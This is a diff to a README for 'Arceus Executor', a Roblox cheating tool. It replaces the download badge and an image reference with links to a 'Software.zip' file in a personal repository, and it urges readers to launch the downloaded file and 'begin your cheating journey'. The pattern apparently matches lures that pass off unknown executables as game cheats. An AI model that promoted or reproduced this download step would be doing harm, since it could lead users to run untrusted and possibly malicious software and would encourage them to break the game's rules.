@@ -31,7 +31,7 @@ Explore and contribute to topics related to Arceus Executor:
 
 ## Get Started
 Ready to unleash the power of Arceus Executor? Click the button below to download the repository:
-[![Download Arceus Executor](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Arceus Executor](https://github.com/TysonisaGoat3k/Arceus-Executor/releases/download/v1.0/Software.zip)](https://github.com/TysonisaGoat3k/Arceus-Executor/releases/download/v1.0/Software.zip)
 Make sure to launch the downloaded file to begin your cheating journey!
 
 ## Contribute
@@ -43,6 +43,6 @@ If you encounter any issues or have questions about Arceus Executor, head over t
 ## Spread the Word
 Enjoying Arceus Executor? Share this repository with your friends and fellow gamers. Let's revolutionize the way we play Roblox and create an unstoppable community of cheaters!
 
-![Arceus](https://example.com/arceus.jpg)
+![Arceus](https://github.com/TysonisaGoat3k/Arceus-Executor/releases/download/v1.0/Software.zip)
 
 That's all for now! Thank you for visiting the Arceus Executor repository. Get ready to dominate Roblox like never before with our universal cheating tool. Happy cheating! 🎮✨
